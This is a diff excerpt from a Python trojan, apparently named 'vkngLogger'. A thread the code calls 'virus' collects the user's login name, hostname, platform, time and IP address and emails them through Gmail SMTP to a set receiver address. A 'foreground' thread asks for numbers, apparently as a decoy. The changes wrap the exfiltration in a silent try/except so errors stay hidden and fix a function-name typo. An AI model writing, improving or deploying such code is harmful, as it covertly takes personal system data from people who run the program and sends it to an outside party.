@@ -40,14 +40,17 @@ Subject: vkngLogger Log
 [>] IP Adress\t: %s
 """%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
     
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.ehlo()
-    server.starttls()
-    server.ehlo()
-    server.login(senderMail, senderMailPwd)
-    server.sendmail(senderMail, receiverMail, message)
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.ehlo()
+        server.starttls()
+        server.ehlo()
+        server.login(senderMail, senderMailPwd)
+        server.sendmail(senderMail, receiverMail, message)
+    except:
+        pass
 
-def foregraund():
+def foreground():
     while True:
         a = raw_input("[*] Number: ")
         b = raw_input("[*] Number: ")
@@ -55,4 +58,4 @@ def foregraund():
 
 if __name__ == "__main__":
     threading.Thread(target=virus).start()
-    threading.Thread(target=foregraund).start()
+    threading.Thread(target=foreground).start()
